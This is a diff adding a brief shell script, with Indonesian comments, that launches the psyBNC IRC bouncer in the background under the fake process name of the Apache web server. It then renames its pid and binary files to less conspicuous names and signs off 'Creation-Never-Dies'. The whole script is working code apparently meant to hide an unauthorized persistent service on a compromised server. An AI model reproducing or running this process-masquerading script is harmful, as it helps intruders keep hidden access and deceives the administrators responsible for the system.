@@ -1,0 +1,10 @@
+#!/bin/sh
+./proc -s "/usr/local/apache/bin/httpd -DSSL" -d -p sukses.pid ./psybnc
+ps x
+echo "cant you see your psybnc pid background"
+# Sekarang remove file nya yah
+mv psybnc.pid sukses.pid
+mv psybnc mich
+echo "proses selesai silahkan jalankan psybnc anda pada port yang anda pilih"
+echo ""
+echo "Creation-Never-Dies"
